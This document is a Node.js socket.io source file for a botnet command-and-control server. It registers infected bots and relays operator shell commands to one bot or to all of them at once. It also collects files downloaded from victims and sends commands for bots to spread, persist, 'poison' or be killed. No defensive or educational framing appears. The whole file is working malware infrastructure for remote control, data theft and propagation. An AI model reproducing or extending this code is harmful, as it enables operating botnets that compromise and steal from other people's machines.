const PORT = 3000;
const express = require('express');
const app = express();

const http = require('http');
const server = http.createServer(app);

const crypto = require("crypto");

const { Server } = require('socket.io');
const io = new Server(server);

const CmdType = {
    GETBOTS: 0,
    INFOBOTS: 1,
    MASSCMD: 2,
    BOTCMD: 3,
    LISTFILES: 5,
    UPLOADBOT: 6,
    DOWNLOADBOT: 7,
    DOWNLOADFILE: 8,
    KILLBOT: 9,
    SPREADBOT: 10,
    PERSISTBOT: 11,
    POISONBOT: 12,
};

const MsgType = {
    NEWBOT: 0,
    BOTLIST: 1,
    BOTINFO: 2,
    BOTRESP: 3,
    BOTLEAVE: 4,
    FILELIST: 5,
}

const BotCmdType = {
    REGISTER: 0,
    SHELL: 1,
    UPLOAD: 2,
    DOWNLOAD: 3,
    SETBOTID: 4,
    KILL: 5,
    SPREAD: 6,
    PERSIST: 7,
    POISON: 8
}

const bots = {};
const downloaded = [];

const getBots = ({socket}) => {
    socket.emit("info", {
        "type": MsgType.BOTLIST,
        "data": bots
    });
}

const getBotInfo = ({socket, args}) => {
    // console.log(`searching for bot: ${args}`);
    let bot = bots[args];
    socket.emit("info", {
        "type": MsgType.BOTINFO,
        "data": bot
    });
}

const sendMassCmd = ({socket, cmd, args}) => {
    socket.broadcast.emit("botcmd", {
        from: "global",
        cmd: cmd,
        args: args
    });
}

const sendBotCmd = ({socket, cmd, args, to}) => {
    socket.to(to).emit("botcmd", {
        cmd: cmd,
        args: args,
        from: socket.id,
    })
}

const broadcastLeave = ({socket}) => {
    let botid = socketToBot({socket});
    socket.broadcast.emit("info", {
        "type": MsgType.BOTLEAVE,
        "data": {
            id: botid
        }
    })
}

const listFiles = ({socket}) => {
    let files =  downloaded.map((f, idx) => {
        return {idx: idx, botid: f.botid, fname: f.dest};
    });
    socket.emit("info", {
        "type": MsgType.FILELIST,
        "data": files,
    })
}

const getFile = ({socket, args}) => {
    let dest = args["dest"]
    let fileid = args["id"]
    let file = downloaded[fileid];
    socket.emit("downloaddata", {
        dest: dest,
        data: file,
    })
}

const socketToBot = ({socket}) => {
    let botid = null;
    Object.entries(bots).forEach(([bot_id, bot]) => {
        if (bot.socket_id === socket.id) {
            botid = bot_id;
        }
    })
    return botid;
}

io.on('connection', (socket) => {
    console.log("connection opened by " + socket.id);

    // Send register command to bot
    socket.emit('botcmd', {
        cmd: BotCmdType.REGISTER
    });

    socket.on('operator', () => {
        console.log(socket.id + " joining operators")
        socket.join("global");
    })

    socket.on('disconnect', () => {
        console.log('disconnected ' + socket.id);
        Object.entries(bots).forEach(([bot_id, bot]) => {
            if (bot.socket_id === socket.id) {
                bots[bot_id].online = false;
                broadcastLeave({socket});
            }
        })
    })

    // Process commands received from operator
    socket.on("opcmd", async({to, type, cmd, args}) => {
        console.log(`[OPCMD] to: ${to} type: ${type} cmd: ${cmd} args: ${args}`)
        switch(type) {
            case CmdType.GETBOTS:
                getBots({socket});
                break;
            case CmdType.INFOBOTS:
                getBotInfo({socket, args})
                break;
            case CmdType.MASSCMD:
                sendMassCmd({socket, cmd: BotCmdType.SHELL, args})
                break;
            case CmdType.BOTCMD:
                sendBotCmd({socket, cmd: BotCmdType.SHELL, args, to: bots[to].socket_id})
                break;
            case CmdType.LISTFILES:
                listFiles({socket})
                break;
            case CmdType.UPLOADBOT:
                sendBotCmd({socket, cmd: BotCmdType.UPLOAD, args, to: bots[to].socket_id})
                break;
            case CmdType.DOWNLOADBOT:
                sendBotCmd({socket, cmd: BotCmdType.DOWNLOAD, args, to: bots[to].socket_id})
                break;
            case CmdType.DOWNLOADFILE:
                getFile({socket, args})
                break;
            case CmdType.KILLBOT:
                sendBotCmd({socket, cmd: BotCmdType.KILL, args: null, to: bots[to].socket_id})
                delete bots[to];
                break;
            case CmdType.SPREADBOT:
                sendBotCmd({socket, cmd: BotCmdType.SPREAD, args: null, to: bots[to].socket_id})
                break;
            case CmdType.PERSISTBOT:
                sendBotCmd({socket, cmd: BotCmdType.PERSIST, args: null, to: bots[to].socket_id})
                break;
            case CmdType.POISONBOT:
                sendBotCmd({socket, cmd: BotCmdType.POISON, args, to: bots[to].socket_id})
                break;
            default:
                console.log(`Received unknown type: ${type}`)
        }
    })

    // Process responses received from bot
    socket.on("botresp", async({cmd, to, args}) => {
        const botid = socketToBot({socket});
        switch(cmd) {
            case BotCmdType.REGISTER:
                console.log("received registering " + socket.id);
                const bot_id = (args.bot_id) ? args.bot_id : crypto.randomBytes(4).toString("hex");
                if (args.bot_id && bots[bot_id]) {
                    bots[bot_id].socket_id = socket.id;
                    bots[bot_id].online = true;
                } else {
                    bots[bot_id] = {socket_id: socket.id, online: true, details: args.details};
                    // tell bot to save the BOTID
                    socket.emit('botcmd', {
                        cmd: BotCmdType.SETBOTID,
                        args: bot_id,
                    });
                }
                socket.broadcast.emit("info", {
                    "type": MsgType.NEWBOT,
                    "data": {
                        id: bot_id,
                        details: args.detail,
                    }
                })
                break;
            case BotCmdType.SHELL:
                console.log("received shell response from " + socket.id);
                socket.to(to).emit("info", {
                    "type": MsgType.BOTRESP,
                    "data": {
                        from: botid,
                        msg: args.response,
                        stderr: args.stderr,
                    }
                })
                break;
            case BotCmdType.UPLOAD:
                console.log("received upload response from " + socket.id);
                socket.to(to).emit("info", {
                    "type": MsgType.BOTRESP,
                    "data": {
                        from: botid,
                        msg: `Successfully uploaded file to ${args.dest}`
                    }
                });
                break;
            case BotCmdType.DOWNLOAD:
                console.log("received download data from " + socket.id);
                downloaded.push({botid: botid, dest: args.dest, filedata: args.filedata});
                socket.to(to).emit("info", {
                    "type": MsgType.BOTRESP,
                    "data": {
                        from: botid,
                        msg: `Received file from bot: ${args.dest}`
                    }
                });
                break;
            case BotCmdType.SPREAD:
            case BotCmdType.PERSIST:
            case BotCmdType.POISON:
                socket.to(to).emit("info", {
                    "type": MsgType.BOTRESP,
                    "data": {
                        from: botid,
                        msg: args.response,
                    }
                })
                break;
            default:
                console.log(`Received unknown botresp: ${cmd}`);
        }

    });
})

server.listen(PORT, () => {
    console.log("listening...")
})